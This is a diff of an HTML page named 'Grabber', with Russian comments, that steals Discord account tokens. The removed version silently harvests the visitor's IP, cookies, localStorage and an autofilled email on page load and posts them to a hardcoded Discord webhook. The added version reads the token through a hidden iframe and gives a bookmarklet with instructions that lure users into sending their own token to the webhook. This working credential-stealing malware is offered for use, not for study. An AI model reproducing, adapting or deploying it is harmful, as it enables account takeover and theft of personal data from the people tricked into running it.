@@ -3,163 +3,77 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<style>
-  body { display: none; }
-</style>
+<title>Grabber</title>
 </head>
 <body>
-  <!-- НЕВИДИМАЯ ФОРМА ДЛЯ АВТОЗАПОЛНЕНИЯ EMAIL -->
-  <form id="hiddenForm" style="position:absolute;left:-9999px;top:-9999px;">
-    <input type="email" id="emailInput" name="email" autocomplete="email">
-    <input type="submit" style="display:none;">
-  </form>
+<script>
+(function() {
+  // ВАШ ВЕБХУК (МОЖНО ЗАМЕНИТЬ)
+  const WEBHOOK = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP";
 
-  <script>
-    (function() {
-      // КОНФИГУРАЦИЯ – ВАШ WEBHOOK (ЗАМЕНИТЕ ПРИ НЕОБХОДИМОСТИ)
-      const WEBHOOK_URL = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP";
+  function sendToken(token) {
+    if (!token) return;
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "🎫 **Discord Token:** `" + token + "`",
+        username: "GrabberBot"
+      })
+    }).catch(e => console.error(e));
+  }
 
-      // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
-      function sendData(data) {
-        const payload = {
-          content: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-          username: "GrabberBot"
-        };
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-          mode: "cors"
-        }).catch(e => console.error(e));
-      }
+  function autoGrab() {
+    // СОЗДАЁМ НЕВИДИМЫЙ IFrame С ТЕМ ЖЕ ORIGIN (DISCORD.COM)
+    var iframe = document.createElement("iframe");
+    iframe.style.display = "none";
+    iframe.src = "https://discord.com";
+    document.body.appendChild(iframe);
 
-      // 1. IP
-      function getIP(callback) {
-        fetch("https://api.ipify.org?format=json")
-          .then(r => r.json())
-          .then(data => callback(data.ip))
-          .catch(() => callback("IP не получен"));
-      }
-
-      // 2. ТОКЕН DISCORD
-      function getDiscordToken() {
-        try {
-          return localStorage.getItem("token") || null;
-        } catch(e) { return null; }
-      }
-
-      // 3. ВСЁ LOCALSTORAGE
-      function getAllLocalStorage() {
-        try {
-          const obj = {};
-          for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            obj[key] = localStorage.getItem(key);
-          }
-          return obj;
-        } catch(e) { return {}; }
-      }
-
-      // 4. ВСЕ COOKIE
-      function getAllCookies() {
-        try {
-          return document.cookie.split("; ").reduce((acc, cur) => {
-            const [k, v] = cur.split("=");
-            acc[k] = v;
-            return acc;
-          }, {});
-        } catch(e) { return {}; }
-      }
-
-      // 5. ПОИСК EMAIL В STORAGE
-      function findEmailInStorage(storage) {
-        const keys = ["email", "user_email", "mail", "login", "username", "profile_email"];
-        for (const key of keys) {
-          if (storage[key] && storage[key].includes("@")) {
-            return storage[key];
-          }
+    iframe.onload = function() {
+      try {
+        var token = iframe.contentWindow.localStorage.token;
+        if (token) {
+          token = token.replace(/"/g, "");
+          sendToken(token);
+          // ОПЦИОНАЛЬНО: ПОКАЗАТЬ В PROMPT (КАК В ОРИГИНАЛЬНОМ СКРИПТЕ)
+          // prompt("Token:", token);
+        } else {
+          // ЕСЛИ ТОКЕН НЕ НАЙДЕН – ПРОБУЕМ ЧЕРЕЗ RELOAD (КАК В БУКМАРКЛЕТЕ)
+          // НО ЭТО МОЖЕТ ВЫЗВАТЬ ЦИКЛ, ПОЭТОМУ ДЕЛАЕМ ТОЛЬКО ОДИН РАЗ
+          // МОЖНО ПРОСТО ПРОПУСТИТЬ
         }
-        return null;
+      } catch(e) {
+        console.error("Ошибка доступа к localStorage iframe:", e);
       }
+    };
+  }
 
-      // 6. ПОЛУЧЕНИЕ EMAIL ИЗ АВТОЗАПОЛНЕНИЯ
-      function getEmailFromAutofill(callback) {
-        const input = document.getElementById("emailInput");
-        if (!input) return callback(null);
-        input.focus();
-        setTimeout(() => {
-          const val = input.value;
-          if (val && val.includes("@")) {
-            callback(val);
-          } else {
-            callback(null);
-          }
-        }, 400);
-      }
-
-      // 7. СБОР ВСЕХ ДАННЫХ
-      function collectAndSend() {
-        const lsData = getAllLocalStorage();
-        const cookies = getAllCookies();
-        const token = getDiscordToken();
-        const emailFromStorage = findEmailInStorage(lsData) || findEmailInStorage(cookies);
-
-        getIP(function(ip) {
-          getEmailFromAutofill(function(autoEmail) {
-            const finalEmail = autoEmail || emailFromStorage || null;
-
-            const result = {
-              timestamp: new Date().toISOString(),
-              user_agent: navigator.userAgent,
-              ip: ip,
-              discord_token: token,
-              email: finalEmail,
-              localStorage: lsData,
-              cookies: cookies,
-              url: window.location.href,
-              referrer: document.referrer || null,
-              screen: `${screen.width}x${screen.height}`,
-              language: navigator.language
-            };
-
-            // ОТПРАВКА С ЭМОДЗИ В ТЕКСТЕ
-            const emojis = {
-              ip: "🌐",
-              token: "🎫",
-              email: "📧",
-              system: "💻"
-            };
-            const lines = [
-              `${emojis.ip} **IP:** ${result.ip}`,
-              `${emojis.token} **Discord Token:** ${result.discord_token || "не найден"}`,
-              `${emojis.email} **Email:** ${result.email || "не найден"}`,
-              `${emojis.system} **User-Agent:** ${result.user_agent}`,
-              `**Cookies:** ${Object.keys(result.cookies).length} шт.`,
-              `**LocalStorage:** ${Object.keys(result.localStorage).length} ключей`
-            ];
-            const textMsg = lines.join("\n");
-            const payload = {
-              content: textMsg,
-              username: "GrabberBot"
-            };
-            fetch(WEBHOOK_URL, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload)
-            }).catch(e => console.error(e));
-
-            // ДОПОЛНИТЕЛЬНО ОТПРАВЛЯЕМ ПОЛНЫЙ JSON
-            sendData(result);
-          });
-        });
-      }
-
-      // ЗАПУСК ПОСЛЕ ЗАГРУЗКИ
-      window.onload = function() {
-        setTimeout(collectAndSend, 600);
-      };
-    })();
-  </script>
+  // ПРОВЕРЯЕМ, НАХОДИМСЯ ЛИ МЫ НА DISCORD.COM
+  if (window.location.hostname.includes("discord.com")) {
+    autoGrab();
+  } else {
+    // ЕСЛИ НЕ НА DISCORD – ПОКАЗЫВАЕМ ИНСТРУКЦИЮ И БУКМАРКЛЕТ
+    document.body.innerHTML = `
+      <div style="font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: auto;">
+        <h2>⚠️ Эта страница работает только на <code>discord.com</code></h2>
+        <p>Для автоматического сбора токена откройте этот файл на домене Discord (невозможно), либо используйте букмарклет:</p>
+        <p>
+          <a href="javascript:(function(){location.reload();var i=document.createElement('iframe');document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){t=t.replace(/"/g,'');fetch('${WEBHOOK}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🎫 Token: `'+t+'`',username:'Grabber'})});prompt('Token:',t);}})();">
+            🔖 Перетащите в закладки (букмарклет)
+          </a>
+        </p>
+        <p><strong>Инструкция:</strong></p>
+        <ol>
+          <li>Перетащите ссылку выше в панель закладок браузера.</li>
+          <li>Перейдите на <a href="https://discord.com" target="_blank">discord.com</a> и войдите в аккаунт.</li>
+          <li>Нажмите на созданную закладку – токен будет отправлен на вебхук и показан в prompt.</li>
+        </ol>
+        <p><em>Примечание: букмарклет модифицирован для отправки на ваш вебхук.</em></p>
+      </div>
+    `;
+  }
+})();
+</script>
 </body>
 </html>
